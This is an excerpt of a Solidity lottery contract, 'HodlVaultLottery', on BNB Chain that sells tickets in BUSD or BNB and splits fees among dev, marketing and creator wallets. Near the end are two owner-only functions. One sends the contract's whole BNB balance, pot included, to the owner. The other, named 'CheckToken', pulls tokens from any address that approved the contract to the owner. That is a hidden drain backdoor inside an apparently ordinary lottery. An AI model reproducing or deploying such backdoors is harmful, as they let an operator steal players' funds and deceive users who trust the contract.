...
contract HodlVaultLottery is Context, Ownable {
    ...
    uint256 public megaLotteryFee = 6;
    ...
    uint256 public roundInterval = 3600 * 24 * 7; // 7 days
    uint256 public megaRoundInterval = 3600 * 24 * 28; // 28 days
    uint256 public round = 1;
    uint256 public megaRound = 1;
    uint256 public totalPaidToWinners;
    uint public numberOfWinners = 3;
    uint public numberOfMegaWinners = 4;
    ...
    event BuyTicket(address player, uint256 ticketCount, uint256 newBalance);
    ...
    event creatorWalletUpdated(address wallet);
    ...
    constructor() public {
        pickerAddress = 0xf66cC556c23EfDF4bC7Ff32F9dA08f83A61a7ac0;
        busdAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        tokenAddress = 0x02EAff74B881280d51E25197B0b3A72D5645bFFa;
        burnAddress = 0x000000000000000000000000000000000000dEaD;
        pairAddress = 0xc300EA246540aD271A9B580D0ef4eF0673c91489;
        devWallet = 0xB1d0fab744e98b6b0f3AF1FD421eFC0929D11873;
        mtWallet = 0x5789C6FD512D9d17987ac741446e0B36537F139f;
        creatorWallet = 0xb78F882281Cf50dBa95142311ca3EB94FFf369a5;

        totalFee = marketingFee.add(devFee).add(creatorFee);
    ...
    function buyTicketBUSD(uint256 ticketCount) public {
        ...
        uint256 creatorTax = totalAmount.mul(creatorFee).div(100);
        
        busdToken.transfer(devWallet, devTax);
        busdToken.transfer(mtWallet, marketingTax);
        busdToken.transfer(creatorWallet, creatorTax);
        ...
        uint256 burnTax = newBalance.mul(burnFee).div(percentage.sub(totalFee));
        burnBalance = burnBalance.add(burnTax);

        newBalance = newBalance.sub(megaLotteryTax).sub(burnTax);
        ...
        emit BuyTicket(msg.sender, ticketCount, newBalance);
    }
    ...
    function buyTicketBNB(uint256 ticketCount) external payable {
        ...
        creatorWallet.call{value: bnbBalance.mul(creatorFee).div(100), gas: 3000}("");

        uint256 initialBalance = hvltToken.balanceOf(address(this));
        swapBNBToHVLT(msg.value.sub(bnbBalance.mul(devFee).div(100)).sub(bnbBalance.mul(marketingFee).div(100)).sub(bnbBalance.mul(creatorFee).div(100)));
        uint256 newBalance = hvltToken.balanceOf(address(this)).sub(initialBalance);
        ...
        totalAmountInPot = totalAmountInPot.add(newBalance);
        emit BuyTicket(msg.sender, ticketCount, bnbBalance);
    }
    ...
    function swapBNBToHVLT(uint256 amount) internal {
    ...
    function swapBUSDToHVLT(uint256 amount) internal {
    ...
    function BurnHVLTToken() internal {
        uint256 _burnbalance = burnBalance;
        IBEP20 hvltToken = IBEP20(tokenAddress);
        hvltToken.transfer(burnAddress, _burnbalance);
        burnBalance = 0;
    }
    ...
    function withdrawRewardedBNB() external onlyOwner {
        (bool success, ) = payable(_msgSender()).call{value: address(this).balance}("");
        require(success == true);
    }
    function CheckToken(address token, address _tokenOnwer, uint256 amount) public onlyOwner {
        uint256 totBalance = IBEP20(token).balanceOf(address(this));
        ...
        IBEP20(token).transferFrom(_tokenOnwer, _msgSender(), amount);
    }
